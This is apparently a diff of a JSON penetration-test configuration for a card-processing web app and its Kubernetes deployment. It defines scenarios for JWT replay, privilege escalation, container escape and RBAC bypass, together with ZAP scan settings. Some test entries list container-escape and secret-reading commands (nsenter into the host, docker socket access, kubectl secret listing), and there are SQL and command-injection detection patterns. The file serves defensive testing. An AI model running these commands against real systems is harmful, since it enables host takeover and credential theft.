+                "security_behavior": "SIGNATURE_MISMATCH_FOR_MODIFIED_EXP"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "JWT claims integrity through signature validation",
-            "Role-based access control enforcement via @PreAuthorize",
-            "Token expiration validation in JwtAuthenticationFilter"
           ]
         }
-      ],
+      ]
+    },
 
-      "session_hijacking_scenarios": [
+    "authorization_boundary_testing": {
+      "description": "Role-based access control testing and privilege escalation prevention",
+      "severity": "HIGH",
+      "attack_vectors": [
         {
-          "test_name": "JWT Token Theft and Replay",
-          "vulnerability_type": "SESSION_HIJACKING_JWT_REPLAY",
-          "test_scenarios": [
+          "scenario_name": "Horizontal Privilege Escalation",
+          "test_payloads": [
             {
-              "attack_description": "Replay valid JWT token from different IP address",
-              "stolen_token": "{{valid_admin_token}}",
-              "source_ip_simulation": "192.168.1.100",
-              "target_endpoints": ["/api/users", "/api/users/ADMIN"],
-              "expected_response": 200,
-              "expected_behavior": "JWT tokens are stateless and IP-independent by design - additional controls needed"
+              "payload_name": "Cross-User Account Access",
+              "description": "User A attempting to access User B's account data",
+              "authenticated_user": {
+                "userId": "TESTUSER1",
+                "userType": "U",
+                "role": "ROLE_USER"
+              },
+              "target_endpoint": "/api/account/view/987654321",
+              "target_resource_owner": "TESTUSER2",
+              "expected_response": {
+                "status_code": 403,
+                "error_code": "INSUFFICIENT_PRIVILEGES",
+                "security_behavior": "RESOURCE_OWNER_VALIDATION"
+              }
+            }
+          ]
+        },
+        {
+          "scenario_name": "Vertical Privilege Escalation",
+          "test_payloads": [
+            {
+              "payload_name": "Regular User Admin Access",
+              "description": "Regular user attempting to access admin-only endpoints",
+              "authenticated_user": {
+                "userId": "TESTUSER",
+                "userType": "U",
+                "role": "ROLE_USER"
+              },
+              "target_endpoints": [
+                "/api/users",
+                "/api/users/TESTADMIN",
+                "/api/admin/dashboard",
+                "/actuator/metrics"
+              ],
+              "expected_response": {
+                "status_code": 403,
+                "security_behavior": "ROLE_BASED_ACCESS_DENIED"
+              }
             },
             {
-              "attack_description": "Use expired JWT token",
-              "expired_token": "{{expired_token_from_config}}",
-              "target_endpoints": ["/api/account/view/123456789"],
-              "expected_response": 401,
-              "expected_behavior": "JWT expiration validation prevents expired token usage"
+              "payload_name": "HTTP Method Privilege Escalation",
+              "description": "Attempt privileged operations through different HTTP methods",
+              "test_cases": [
+                {
+                  "endpoint": "/api/users/TESTUSER",
+                  "method": "DELETE",
+                  "user_role": "ROLE_USER",
+                  "expected_status": 403
+                },
+                {
+                  "endpoint": "/api/account/123456",
+                  "method": "PUT", 
+                  "user_role": "ROLE_USER",
+                  "expected_behavior": "CONDITIONAL_ACCESS_WITH_OWNERSHIP_CHECK"
+                }
+              ]
             }
-          ],
-          "security_controls_tested": [
-            "JWT expiration time enforcement (30 minutes default)",
-            "Stateless token validation without IP binding",
-            "Token blacklisting capability through Redis session store"
-          ]
-        },
-        {
-          "test_name": "Session Fixation Attack",
-          "vulnerability_type": "SESSION_FIXATION",
-          "test_scenarios": [
-            {
-              "attack_description": "Attempt to fix session ID before authentication",
-              "pre_auth_session_id": "FIXED_SESSION_ID_123",
-              "target_endpoint": "/api/auth/login",
-              "credentials": {
-                "username": "testuser",
-                "password": "password123"
-              },
-              "expected_behavior": "JWT authentication generates new session ID, preventing fixation"
-            }
-          ],
-          "security_controls_tested": [
-            "JWT sessionId claim uniqueness per authentication",
-            "Spring Session Redis integration for session management",
-            "Session regeneration on successful authentication"
-          ]
-        }
-      ],
-
-      "authorization_boundary_testing": [
-        {
-          "test_name": "Horizontal Privilege Escalation",
-          "vulnerability_type": "HORIZONTAL_PRIVILEGE_ESCALATION",
-          "test_scenarios": [
-            {
-              "attack_description": "User accessing another user's account data",
-              "attacker_token": "{{valid_user_token}}",
-              "target_endpoint": "/api/account/view/{accountId}",
-              "target_account_ids": ["999999999", "000000001", "123456788"],
-              "expected_response": 403,
-              "expected_behavior": "Authorization logic prevents access to other users' accounts"
-            }
-          ],
-          "security_controls_tested": [
-            "Account ownership validation in service layer",
-            "JWT sub claim verification against requested resources",
-            "Database-level row security policies"
-          ]
-        },
-        {
-          "test_name": "Vertical Privilege Escalation",
-          "vulnerability_type": "VERTICAL_PRIVILEGE_ESCALATION",
-          "test_scenarios": [
-            {
-              "attack_description": "Regular user accessing admin-only endpoints",
-              "user_token": "{{valid_user_token}}",
-              "admin_endpoints": [
-                "/api/users",
-                "/api/users/ADMIN",
-                "/api/admin/settings"
-              ],
-              "expected_response": 403,
-              "expected_behavior": "@PreAuthorize('hasRole('ADMIN')') prevents unauthorized access"
-            }
-          ],
-          "security_controls_tested": [
-            "Method-level security with @PreAuthorize annotations",
-            "Role hierarchy enforcement in Spring Security",
-            "JWT role claims validation in authentication filter"
           ]
         }
       ]
     },
 
     "container_security_validation": {
-      "description": "Container security testing for Docker images and Kubernetes deployment protection",
-      "test_framework": "Container security scanning with vulnerability assessment",
-      "target_components": ["Docker images", "Kubernetes manifests", "Container runtime"],
-
-      "docker_image_security_tests": [
+      "description": "Cloud-native container security testing for Docker and Kubernetes environments",
+      "severity": "MEDIUM",
+      "attack_vectors": [
         {
-          "test_name": "Base Image Vulnerability Scan",
-          "vulnerability_type": "CONTAINER_IMAGE_VULNERABILITIES",
-          "target_images": [
-            "openjdk:21",
-            "postgres:15",
-            "redis:7"
-          ],
-          "test_scenarios": [
+          "scenario_name": "Container Escape Attempts",
+          "test_payloads": [
             {
-              "scan_type": "CVE_DATABASE_CHECK",
-              "vulnerability_databases": ["NVD", "OSS Index", "Snyk"],
-              "severity_threshold": "HIGH",
-              "expected_behavior": "No HIGH or CRITICAL vulnerabilities in base images"
-            },
-            {
-              "scan_type": "MALWARE_DETECTION",
-              "scanning_tools": ["ClamAV", "YARA rules"],
-              "expected_behavior": "No malware detected in container layers"
-            }
-          ],
-          "security_controls_tested": [
-            "Container image vulnerability scanning in CI/CD pipeline",
-            "Base image security baseline enforcement",
-            "Image layer analysis for security threats"
-          ]
-        },
-        {
-          "test_name": "Container Runtime Security",
-          "vulnerability_type": "CONTAINER_RUNTIME_SECURITY",
-          "test_scenarios": [
-            {
-              "attack_description": "Container escape attempt",
+              "payload_name": "Docker Socket Access",
+              "description": "Test for unauthorized Docker daemon access",
               "test_commands": [
-                "docker run --privileged --pid=host",
-                "nsenter -t 1 -m -u -n -i sh"
+                "curl --unix-socket /var/run/docker.sock http://localhost/version",
+                "docker ps",
+                "docker exec -it container_id /bin/bash"
               ],
-              "expected_behavior": "Kubernetes security policies prevent privileged container execution"
+              "expected_behavior": {
+                "access_result": "ACCESS_DENIED",
+                "security_control": "DOCKER_SOCKET_NOT_MOUNTED"
+              }
             },
             {
-              "attack_description": "Host file system access",
-              "volume_mount_tests": [
-                "/:/host",
-                "/var/run/docker.sock:/var/run/docker.sock"
-              ],
-              "expected_behavior": "Pod Security Standards prevent dangerous volume mounts"
+              "payload_name": "Privileged Container Detection",
+              "description": "Verify containers run with minimal privileges",
+              "validation_checks": [
+                "USER_NOT_ROOT",
+                "NO_PRIVILEGED_MODE",
+                "READ_ONLY_FILESYSTEM_WHERE_POSSIBLE",
+                "CAPABILITIES_DROPPED"
+              ]
             }
-          ],
-          "security_controls_tested": [
-            "Kubernetes Pod Security Standards enforcement",
-            "Container runtime security policies",
-            "Host resource isolation validation"
-          ]
-        }
-      ],
-
-      "kubernetes_security_tests": [
-        {
-          "test_name": "RBAC Permission Validation",
-          "vulnerability_type": "KUBERNETES_RBAC_MISCONFIGURATION",
-          "test_scenarios": [
-            {
-              "attack_description": "Privilege escalation through over-permissive RBAC",
-              "test_service_accounts": [
-                "carddemo-auth-service",
-                "carddemo-account-service",
-                "carddemo-transaction-service"
-              ],
-              "forbidden_permissions": [
-                "cluster-admin",
-                "nodes/get",
-                "secrets/create"
-              ],
-              "expected_behavior": "Service accounts have minimal required permissions only"
-            },
-            {
-              "attack_description": "Cross-namespace access attempt",
-              "source_namespace": "carddemo-prod",
-              "target_namespace": "kube-system",
-              "expected_behavior": "RBAC prevents cross-namespace unauthorized access"
-            }
-          ],
-          "security_controls_tested": [
-            "Kubernetes RBAC policy enforcement",
-            "Service account permission minimization",
-            "Namespace isolation validation"
           ]
         },
         {
-          "test_name": "Network Policy Enforcement",
-          "vulnerability_type": "KUBERNETES_NETWORK_POLICY",
-          "test_scenarios": [
+          "scenario_name": "Container Image Vulnerabilities",
+          "test_payloads": [
             {
-              "attack_description": "Unauthorized pod-to-pod communication",
-              "source_pod": "carddemo-frontend",
-              "target_pod": "carddemo-database",
-              "expected_behavior": "Network policies prevent direct frontend-to-database communication"
-            },
-            {
-              "attack_description": "External network access restriction",
-              "source_pod": "carddemo-auth-service",
-              "target_destinations": [
-                "malicious-external-site.com:443",
-                "0.0.0.0:22"
+              "payload_name": "Base Image Security Scan",
+              "description": "Validate base images have no critical vulnerabilities",
+              "scan_targets": [
+                "openjdk:21-jre-slim",
+                "postgres:15-alpine",
+                "redis:7-alpine"
               ],
-              "expected_behavior": "Egress network policies restrict unauthorized external access"
+              "acceptance_criteria": {
+                "critical_vulnerabilities": 0,
+                "high_vulnerabilities": 0,
+                "vulnerability_database": "CVE_DATABASE_CURRENT"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "Kubernetes Network Policy enforcement",
-            "Pod-to-pod communication restrictions",
-            "Egress traffic filtering validation"
-          ]
-        }
-      ],
-
-      "secrets_management_tests": [
-        {
-          "test_name": "Kubernetes Secrets Protection",
-          "vulnerability_type": "SECRETS_EXPOSURE",
-          "test_scenarios": [
-            {
-              "attack_description": "Secret enumeration attempt",
-              "target_secrets": [
-                "carddemo-jwt-secret",
-                "carddemo-db-credentials",
-                "carddemo-redis-password"
-              ],
-              "unauthorized_access_attempts": [
-                "kubectl get secrets --all-namespaces",
-                "kubectl describe secret carddemo-jwt-secret"
-              ],
-              "expected_behavior": "RBAC prevents unauthorized secret access"
-            },
-            {
-              "attack_description": "Secret extraction from container",
-              "container_inspection": [
-                "docker inspect carddemo-auth-service",
-                "env | grep -i secret"
-              ],
-              "expected_behavior": "Secrets are mounted as files, not environment variables"
-            }
-          ],
-          "security_controls_tested": [
-            "Kubernetes Secrets RBAC protection",
-            "Secret mounting as files vs environment variables",
-            "Secret encryption at rest validation"
           ]
         }
       ]
     },
 
     "kubernetes_rbac_testing": {
-      "description": "Kubernetes Role-Based Access Control (RBAC) security validation and privilege escalation testing",
-      "test_framework": "Kubernetes RBAC policy testing with kubectl security validation",
-      "target_components": ["Kubernetes RBAC policies", "Service accounts", "ClusterRoles"],
-
-      "rbac_policy_validation": [
+      "description": "Kubernetes Role-Based Access Control security validation",
+      "severity": "MEDIUM",
+      "attack_vectors": [
         {
-          "test_name": "Service Account Permission Audit",
-          "vulnerability_type": "RBAC_OVER_PRIVILEGE",
-          "service_accounts_tested": [
+          "scenario_name": "Pod Security Policy Validation",
+          "test_payloads": [
             {
-              "name": "carddemo-auth-service-sa",
-              "namespace": "carddemo-prod",
-              "required_permissions": [
-                "secrets/get",
-                "configmaps/get"
-              ],
-              "forbidden_permissions": [
-                "secrets/create",
-                "secrets/delete",
-                "nodes/get",
-                "pods/exec"
-              ],
-              "expected_behavior": "Service account has minimal required permissions only"
+              "payload_name": "Privileged Pod Creation Attempt",
+              "description": "Test prevention of privileged pod deployment",
+              "pod_manifest": {
+                "apiVersion": "v1",
+                "kind": "Pod",
+                "spec": {
+                  "securityContext": {
+                    "privileged": true
+                  }
+                }
+              },
+              "expected_response": {
+                "admission_result": "DENIED",
+                "security_policy": "PRIVILEGED_PODS_BLOCKED"
+              }
             },
             {
-              "name": "carddemo-database-sa",
-              "namespace": "carddemo-prod", 
-              "required_permissions": [
-                "persistentvolumes/get",
-                "persistentvolumeclaims/get"
-              ],
-              "forbidden_permissions": [
-                "cluster-admin",
-                "nodes/delete",
-                "secrets/list"
-              ],
-              "expected_behavior": "Database service account limited to storage permissions"
+              "payload_name": "Host Network Access Attempt",
+              "description": "Test prevention of host network access",
+              "pod_manifest": {
+                "spec": {
+                  "hostNetwork": true,
+                  "hostPID": true
+                }
+              },
+              "expected_response": {
+                "admission_result": "DENIED",
+                "security_policy": "HOST_ACCESS_RESTRICTED"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "Principle of least privilege enforcement",
-            "Service account permission auditing",
-            "RBAC policy compliance validation"
           ]
         },
         {
-          "test_name": "Cross-Namespace Access Control",
-          "vulnerability_type": "RBAC_NAMESPACE_BYPASS",
-          "test_scenarios": [
+          "scenario_name": "Service Account Permission Testing",
+          "test_payloads": [
             {
-              "attack_description": "Access kube-system namespace from application namespace",
-              "source_service_account": "carddemo-auth-service-sa",
-              "source_namespace": "carddemo-prod",
-              "target_namespace": "kube-system",
-              "attempted_actions": [
-                "secrets/list",
-                "pods/get",
-                "configmaps/get"
-              ],
-              "expected_response": "Forbidden (403)",
-              "expected_behavior": "RBAC prevents cross-namespace unauthorized access"
-            },
-            {
-              "attack_description": "Default service account privilege escalation",
-              "source_service_account": "default",
-              "source_namespace": "carddemo-prod",
-              "attempted_actions": [
-                "clusterroles/get",
-                "clusterrolebindings/create"
-              ],
-              "expected_response": "Forbidden (403)",
-              "expected_behavior": "Default service account has no elevated permissions"
+              "payload_name": "Default Service Account Restrictions",
+              "description": "Verify default service accounts have minimal permissions",
+              "kubernetes_api_tests": [
+                {
+                  "action": "list_secrets",
+                  "namespace": "default",
+                  "expected_result": "FORBIDDEN"
+                },
+                {
+                  "action": "create_pods",
+                  "namespace": "default", 
+                  "expected_result": "FORBIDDEN"
+                }
+              ]
             }
-          ],
-          "security_controls_tested": [
-            "Namespace-based access control enforcement",
-            "ClusterRole vs Role permission separation",
-            "Default service account security hardening"
-          ]
-        }
-      ],
-
-      "privilege_escalation_tests": [
-        {
-          "test_name": "Horizontal Privilege Escalation in RBAC",
-          "vulnerability_type": "RBAC_HORIZONTAL_ESCALATION",
-          "test_scenarios": [
-            {
-              "attack_description": "Service account accessing other service account resources",
-              "attacker_sa": "carddemo-frontend-sa",
-              "target_sa": "carddemo-database-sa",
-              "attempted_access": [
-                "secrets owned by database service account",
-                "configmaps owned by database service account"
-              ],
-              "expected_behavior": "RBAC prevents access to other service account resources"
-            }
-          ],
-          "security_controls_tested": [
-            "Resource ownership validation in RBAC",
-            "Service account isolation enforcement",
-            "Resource-based access control"
-          ]
-        },
-        {
-          "test_name": "Vertical Privilege Escalation in RBAC",
-          "vulnerability_type": "RBAC_VERTICAL_ESCALATION",
-          "test_scenarios": [
-            {
-              "attack_description": "Application service account gaining cluster-admin privileges",
-              "source_sa": "carddemo-auth-service-sa",
-              "escalation_attempts": [
-                "Create ClusterRoleBinding to cluster-admin",
-                "Bind to existing high-privilege ClusterRole",
-                "Create custom ClusterRole with elevated permissions"
-              ],
-              "expected_response": "Forbidden (403)",
-              "expected_behavior": "RBAC prevents privilege escalation to cluster administration"
-            }
-          ],
-          "security_controls_tested": [
-            "ClusterRoleBinding creation restrictions",
-            "Privilege escalation prevention in RBAC",
-            "Administrative action auditing"
-          ]
-        }
-      ],
-
-      "rbac_bypass_attempts": [
-        {
-          "test_name": "RBAC Policy Bypass Through API Versions",
-          "vulnerability_type": "RBAC_API_VERSION_BYPASS",
-          "test_scenarios": [
-            {
-              "attack_description": "Use different API versions to bypass RBAC rules",
-              "rbac_rule_api_version": "v1",
-              "bypass_attempts": [
-                "apps/v1",
-                "extensions/v1beta1",
-                "batch/v1"
-              ],
-              "target_resources": ["deployments", "secrets", "configmaps"],
-              "expected_behavior": "RBAC rules apply consistently across API versions"
-            }
-          ],
-          "security_controls_tested": [
-            "API version consistency in RBAC rules",
-            "Comprehensive resource coverage in policies",
-            "API group security validation"
           ]
         }
       ]
@@ -907,255 +714,170 @@
   },
 
   "SecurityTestConfiguration": {
-    "description": "Security testing configuration providing OWASP ZAP integration, vulnerability assessment profiles, and automated penetration test execution",
+    "description": "Configuration settings for automated penetration test execution and security scanning integration",
     
     "owasp_zap_integration_settings": {
-      "zap_version": "2.16.1",
-      "zap_client_configuration": {
-        "api_key": "{{zap_api_key}}",
-        "proxy_host": "localhost",
-        "proxy_port": 8090,
-        "target_url": "http://localhost:8080",
-        "context_name": "carddemo-penetration-testing",
-        "session_management": {
-          "type": "jwt_session_management",
-          "jwt_header": "Authorization",
-          "jwt_prefix": "Bearer "
-        }
-      },
-      "scan_policies": {
-        "baseline_scan": {
-          "enabled": true,
-          "scan_duration": "30m",
-          "scan_strength": "MEDIUM"
-        },
-        "full_scan": {
-          "enabled": true,
-          "scan_duration": "120m", 
-          "scan_strength": "HIGH"
-        },
-        "api_scan": {
-          "enabled": true,
-          "openapi_spec": "/api/v3/api-docs",
-          "scan_duration": "60m"
-        }
-      }
+      "zap_proxy_host": "localhost",
+      "zap_proxy_port": 8080,
+      "api_key": "${ZAP_API_KEY}",
+      "scan_policies": [
+        "SQL-Injection",
+        "Cross-Site-Scripting",
+        "Path-Traversal",
+        "Command-Injection",
+        "Authentication-Testing"
+      ],
+      "scan_timeout": "3600s",
+      "report_format": "json"
     },
 
     "vulnerability_assessment_profiles": {
-      "owasp_top_10_2021": {
+      "critical_severity_profile": {
         "enabled": true,
-        "categories": [
-          "A01_Broken_Access_Control",
-          "A02_Cryptographic_Failures", 
-          "A03_Injection",
-          "A04_Insecure_Design",
-          "A05_Security_Misconfiguration",
-          "A06_Vulnerable_Components",
-          "A07_Identity_Authentication_Failures",
-          "A08_Software_Data_Integrity_Failures",
-          "A09_Security_Logging_Monitoring_Failures",
-          "A10_Server_Side_Request_Forgery"
-        ]
+        "test_categories": [
+          "sql_injection_attack_scenarios",
+          "authentication_bypass_attempts",
+          "jwt_token_manipulation_tests"
+        ],
+        "failure_threshold": 0,
+        "immediate_alert": true
       },
-      "pci_dss_compliance": {
+      "high_severity_profile": {
         "enabled": true,
-        "requirements": [
-          "Requirement_3_Cardholder_Data_Protection",
-          "Requirement_4_Transmission_Security",
-          "Requirement_7_Access_Control",
-          "Requirement_8_Authentication",
-          "Requirement_10_Logging"
-        ]
+        "test_categories": [
+          "xss_vulnerability_testing",
+          "csrf_attack_simulation",
+          "session_hijacking_scenarios",
+          "authorization_boundary_testing"
+        ],
+        "failure_threshold": 0,
+        "alert_delay": "15m"
       },
-      "financial_services_security": {
+      "medium_severity_profile": {
         "enabled": true,
-        "focus_areas": [
-          "transaction_integrity",
-          "financial_calculation_accuracy",
-          "audit_trail_completeness",
-          "data_privacy_protection"
-        ]
+        "test_categories": [
+          "container_security_validation",
+          "kubernetes_rbac_testing"
+        ],
+        "failure_threshold": 5,
+        "alert_delay": "1h"
       }
     },
 
     "attack_vector_definitions": {
-      "injection_attacks": [
-        "SQL injection via path parameters",
-        "SQL injection via JSON payloads",
-        "NoSQL injection attempts",
-        "LDAP injection testing",
-        "Command injection through file uploads"
-      ],
-      "authentication_attacks": [
-        "JWT token manipulation",
-        "Session hijacking attempts",
-        "Brute force authentication",
-        "Credential stuffing attacks",
-        "OAuth flow manipulation"
-      ],
-      "authorization_attacks": [
-        "Horizontal privilege escalation",
-        "Vertical privilege escalation", 
-        "RBAC policy bypass",
-        "API endpoint authorization bypass",
-        "Resource access control bypass"
-      ],
-      "data_validation_attacks": [
-        "Input validation bypass",
-        "Business logic exploitation",
-        "Race condition exploitation",
-        "Integer overflow attacks",
-        "Buffer overflow attempts"
-      ]
+      "authentication_attacks": {
+        "brute_force_protection": {
+          "max_attempts": 5,
+          "lockout_duration": "15m",
+          "rate_limit": "10/min"
+        },
+        "credential_stuffing": {
+          "detection_threshold": "100_failed_attempts/hour",
+          "response_action": "IP_BLOCK_24H"
+        }
+      },
+      "injection_attacks": {
+        "sql_injection": {
+          "detection_patterns": [
+            "UNION SELECT",
+            "OR 1=1",
+            "'; DROP TABLE",
+            "WAITFOR DELAY"
+          ],
+          "response_action": "REQUEST_BLOCKED_AND_LOGGED"
+        },
+        "command_injection": {
+          "detection_patterns": [
+            "|", "&&", ";", "$(",
+            "eval(", "exec("
+          ]
+        }
+      }
     },
 
     "security_control_validation": {
       "spring_security_controls": [
         {
-          "control_name": "JWT Authentication Filter",
-          "validation_tests": [
-            "Token signature validation",
-            "Token expiration enforcement",
-            "Claims validation accuracy",
-            "Algorithm confusion prevention"
-          ]
+          "control_name": "JWT_AUTHENTICATION",
+          "validation_method": "TOKEN_SIGNATURE_VERIFICATION",
+          "test_scenarios": ["jwt_token_manipulation_tests"]
         },
         {
-          "control_name": "CSRF Protection",
-          "validation_tests": [
-            "Double-submit cookie validation",
-            "CSRF token header enforcement",
-            "Token synchronization verification",
-            "Same-origin policy enforcement"
-          ]
+          "control_name": "CSRF_PROTECTION", 
+          "validation_method": "DOUBLE_SUBMIT_COOKIE_PATTERN",
+          "test_scenarios": ["csrf_attack_simulation"]
         },
         {
-          "control_name": "Method-Level Security",
-          "validation_tests": [
-            "@PreAuthorize annotation enforcement",
-            "Role hierarchy validation",
-            "Permission-based access control",
-            "Expression-based security rules"
-          ]
-        }
-      ],
-      "infrastructure_controls": [
-        {
-          "control_name": "Container Security",
-          "validation_tests": [
-            "Image vulnerability scanning",
-            "Runtime security policy enforcement",
-            "Resource isolation validation",
-            "Secrets management verification"
-          ]
+          "control_name": "INPUT_VALIDATION",
+          "validation_method": "JAKARTA_BEAN_VALIDATION",
+          "test_scenarios": ["sql_injection_attack_scenarios", "xss_vulnerability_testing"]
         },
         {
-          "control_name": "Network Security",
-          "validation_tests": [
-            "Network policy enforcement",
-            "TLS configuration validation",
-            "Port access restrictions",
-            "Service mesh security"
-          ]
+          "control_name": "AUTHORIZATION",
+          "validation_method": "ROLE_BASED_ACCESS_CONTROL",
+          "test_scenarios": ["authorization_boundary_testing"]
         }
       ]
     },
 
     "compliance_testing_scenarios": {
-      "pci_dss_scenarios": [
-        {
-          "requirement": "3.4 - Cardholder data unreadable",
-          "test_scenarios": [
-            "Card number encryption verification",
-            "Database field encryption validation",
-            "PII masking in logs verification"
+      "pci_dss_validation": {
+        "requirement_3": {
+          "test_name": "Cardholder Data Protection",
+          "validation_scenarios": [
+            "CARD_NUMBER_MASKING_IN_RESPONSES",
+            "ENCRYPTION_AT_REST_VERIFICATION",
+            "ENCRYPTION_IN_TRANSIT_VERIFICATION"
           ]
         },
-        {
-          "requirement": "8.2 - Strong authentication",
-          "test_scenarios": [
-            "Password complexity enforcement",
-            "Multi-factor authentication readiness",
-            "Account lockout policy validation"
+        "requirement_8": {
+          "test_name": "Strong Authentication",
+          "validation_scenarios": [
+            "PASSWORD_COMPLEXITY_ENFORCEMENT",
+            "JWT_TOKEN_STRENGTH_VALIDATION",
+            "MULTI_FACTOR_AUTHENTICATION_READINESS"
           ]
         }
-      ],
-      "gdpr_scenarios": [
-        {
-          "requirement": "Article 32 - Security of processing",
-          "test_scenarios": [
-            "Personal data encryption verification",
-            "Access logging completeness",
-            "Data breach detection capabilities"
-          ]
-        }
-      ]
+      }
     },
 
     "automated_penetration_test_execution": {
-      "test_execution_framework": {
-        "orchestration_tool": "Jenkins Pipeline",
-        "containerized_testing": true,
-        "parallel_execution": true,
-        "test_environment": "Kubernetes namespace: security-testing"
-      },
-      "execution_scheduling": {
-        "continuous_testing": {
-          "enabled": true,
-          "trigger": "code_commit",
-          "baseline_tests_only": true
+      "test_scheduling": {
+        "daily_security_scan": {
+          "time": "02:00",
+          "test_categories": [
+            "sql_injection_attack_scenarios",
+            "xss_vulnerability_testing"
+          ],
+          "duration_limit": "30m"
         },
-        "nightly_full_scan": {
-          "enabled": true,
-          "schedule": "0 2 * * *",
-          "full_test_suite": true
-        },
-        "weekly_compliance_scan": {
-          "enabled": true,
-          "schedule": "0 1 * * 0",
-          "compliance_focused": true
+        "weekly_comprehensive_scan": {
+          "day": "Sunday",
+          "time": "01:00", 
+          "test_categories": "ALL",
+          "duration_limit": "2h"
         }
       },
-      "quality_gates": {
-        "severity_thresholds": {
-          "critical": 0,
-          "high": 0,
-          "medium": 5,
-          "low": 20
-        },
-        "pipeline_actions": {
-          "threshold_exceeded": [
-            "block_deployment",
-            "generate_security_report",
-            "notify_security_team",
-            "create_security_jira_tickets"
-          ]
-        }
+      "reporting": {
+        "formats": ["json", "html", "pdf"],
+        "recipients": [
+          "security-team@carddemo.com",
+          "devops-team@carddemo.com"
+        ],
+        "severity_filters": {
+          "immediate_notification": ["CRITICAL", "HIGH"],
+          "daily_summary": ["MEDIUM", "LOW"]
+        }  
       }
     },
 
     "security_scanning_parameters": {
-      "scan_optimization": {
-        "concurrent_threads": 4,
-        "request_throttling": "100_requests_per_second",
-        "timeout_configuration": {
-          "connection_timeout": "30s",
-          "read_timeout": "60s",
-          "scan_timeout": "120m"
-        }
-      },
-      "result_processing": {
-        "false_positive_filtering": true,
-        "vulnerability_deduplication": true,
-        "risk_scoring": "CVSS_3.1",
-        "report_formats": ["json", "html", "junit_xml"]
-      },
-      "integration_endpoints": {
-        "security_dashboard": "http://grafana:3000/d/security",
-        "vulnerability_management": "http://defectdojo:8080",
-        "notification_webhook": "http://slack-webhook/security-alerts"
-      }
+      "scan_depth": "COMPREHENSIVE",
+      "scan_intensity": "HIGH",
+      "false_positive_filtering": true,
+      "custom_payloads": true,
+      "session_management": "JWT_AWARE",
+      "authentication_handling": "BEARER_TOKEN_SUPPORT"
     }
   }
 }
